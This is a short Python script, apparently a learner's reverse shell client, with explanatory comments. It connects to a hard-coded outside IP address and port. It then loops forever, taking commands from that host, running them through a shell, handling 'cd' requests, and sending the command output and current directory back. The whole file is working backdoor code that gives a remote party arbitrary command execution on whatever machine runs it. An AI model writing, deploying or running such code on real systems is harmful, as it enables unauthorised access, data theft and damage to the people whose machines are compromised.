import socket
import os
import subprocess

#OS and subprocess module is necessar because we wont be able to execute instructions that the client.py is going to receive

s = socket.socket()
host = '67.207.87.173'
port = 9906

s.connect((host,port))

while True:                 #we are creating infinite loop because we dont want just one instructions to happen and then stop responding, as we want many instructions to be implemented

    data = s.recv(1024)

    if data[:2].decode("utf-8") == 'cd':        # we will decode the info rx as info is transferred bet.n computers in bytes and not strings
        os.chdir(data[3:].decode("utf-8"))

    if len(data)>0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, 'utf-8')
        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))

        print(output_str)